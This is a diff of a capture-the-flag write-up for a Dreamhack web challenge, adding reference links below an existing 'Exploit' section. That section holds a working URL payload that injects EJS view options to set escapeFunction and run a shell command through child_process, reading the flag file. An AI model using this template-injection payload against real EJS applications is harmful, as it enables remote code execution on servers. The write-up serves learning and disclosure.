@@ -122,3 +122,9 @@ if (opts.client) {
 
 ## Exploit
 `http://host3.dreamhack.games:<PORT>/?settings[view options][client]=true&settings[view options][escapeFunction]='x';return process.mainModule.require('child_process').execSync("cat /flag");`
+
+# Reference
+[blog.huli.tw](https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/)     
+[Web-127-CODEGATE-Music-Player-30-solves](https://nanimokangaeteinai.hateblo.jp/entry/2023/06/19/120016#Web-127-CODEGATE-Music-Player-30-solves)    
+[Github issue](https://github.com/mde/ejs/issues/735)    
+[Github issue](https://github.com/advisories/GHSA-j5pp-6f4w-r5r6)    
